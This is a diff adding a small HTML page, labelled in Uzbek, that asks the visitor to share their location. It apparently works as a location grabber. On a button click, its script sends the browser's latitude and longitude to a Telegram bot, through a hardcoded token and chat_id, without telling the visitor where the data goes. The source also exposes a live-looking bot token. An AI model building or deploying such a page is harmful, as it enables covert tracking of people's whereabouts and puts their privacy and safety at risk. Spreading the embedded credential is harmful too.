@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Location Access</title>
+  </head>
+  <body>
+    <h1>🌍 Joylashuv Ruxsati</h1>
+    <button id="getLocation">Joylashuvni Yuborish</button>
+    <div id="status">Holat: Kutishda...</div>
+
+    <script>
+      document.getElementById("getLocation").addEventListener("click", () => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const lat = position.coords.latitude;
+              const lng = position.coords.longitude;
+
+              document.getElementById(
+                "status"
+              ).innerText = `✅ Joylashuv: ${lat}, ${lng}`;
+
+              // Telegramga yuborish
+              fetch(
+                "https://api.telegram.org/bot8245886522:AAGGhzKyw9rjWrUzmJR11vsORqJs7UdgwQE/sendLocation",
+                {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    chat_id: "7623653728",
+                    latitude: lat,
+                    longitude: lng,
+                  }),
+                }
+              )
+                .then((res) => res.json())
+                .then((data) => console.log(data))
+                .catch((err) => console.error(err));
+            },
+            (error) => {
+              document.getElementById("status").innerText =
+                "❌ Ruxsat berilmadi.";
+              console.error(error);
+            }
+          );
+        } else {
+          document.getElementById("status").innerText =
+            "❌ Brauzeringiz geolokatsiyani qo'llab-quvvatlamaydi.";
+        }
+      });
+    </script>
+  </body>
+</html>
